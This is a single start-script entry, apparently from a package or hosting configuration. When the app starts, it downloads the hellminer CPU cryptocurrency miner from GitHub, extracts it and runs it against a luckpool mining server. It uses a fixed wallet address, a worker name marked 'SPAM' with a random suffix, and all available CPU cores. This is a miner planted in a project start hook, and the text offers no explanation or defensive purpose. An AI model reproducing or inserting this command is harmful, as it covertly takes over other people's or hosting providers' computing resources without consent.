scripts.start: wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RXKKMD5LHex9nrigfwjFeu1t79144WXS2c.SPAM-$(echo $(shuf -i 1-99 -n 1)) -p x --cpu $(echo $(nproc --all))
